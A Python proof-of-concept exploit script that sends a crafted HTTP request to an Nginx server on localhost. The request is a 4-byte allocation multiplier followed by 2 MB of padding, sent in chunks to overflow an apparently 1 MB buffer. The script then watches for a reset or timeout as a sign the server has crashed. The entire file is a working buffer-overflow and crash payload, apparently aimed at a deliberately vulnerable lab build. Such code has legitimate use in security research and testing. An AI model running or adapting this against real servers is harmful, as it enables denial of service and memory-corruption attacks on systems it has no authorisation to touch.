#!/usr/bin/env python3
import socket
import struct
import time

def create_exploit_packet():
    # First 4 bytes: multiplier for allocation size (1000)
    # This will result in allocation of 1000 * 1024 = 1MB
    alloc_multiplier = struct.pack("<I", 1000)
    
    # Create a payload larger than the allocation (2MB of 'A's)
    payload_size = 2 * 1024 * 1024  # 2MB
    payload = b'A' * payload_size
    
    # Create a valid HTTP request with our payload in the body
    http_request = (
        b"GET / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: %d\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    ) % (len(alloc_multiplier) + len(payload))
    
    print(f"[*] Allocation multiplier: 1000 (will allocate 1MB)")
    print(f"[*] Payload size: {payload_size / (1024*1024):.2f} MB")
    
    # Combine HTTP request with our payload
    return http_request + alloc_multiplier + payload

def main():
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    
    try:
        # Connect to Nginx
        print("[*] Connecting to Nginx...")
        s.connect(('localhost', 80))
        
        # Create exploit packet
        print("[*] Creating exploit packet...")
        exploit = create_exploit_packet()
        
        # Send the exploit in chunks
        print("[*] Sending exploit packet in chunks...")
        chunk_size = 1024 * 1024  # 1MB chunks
        sent = 0
        while sent < len(exploit):
            chunk = exploit[sent:sent + chunk_size]
            s.send(chunk)
            sent += len(chunk)
            print(f"[*] Sent {sent / (1024*1024):.2f} MB")
        
        # Wait for response
        print("[*] Waiting for response...")
        time.sleep(2)
        
        # Try to receive response
        try:
            response = s.recv(1024)
            print(f"[*] Received response: {response}")
        except socket.timeout:
            print("[*] No response received (server might have crashed)")
        except ConnectionResetError:
            print("[*] Connection reset by peer (server likely crashed)")
            
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main() 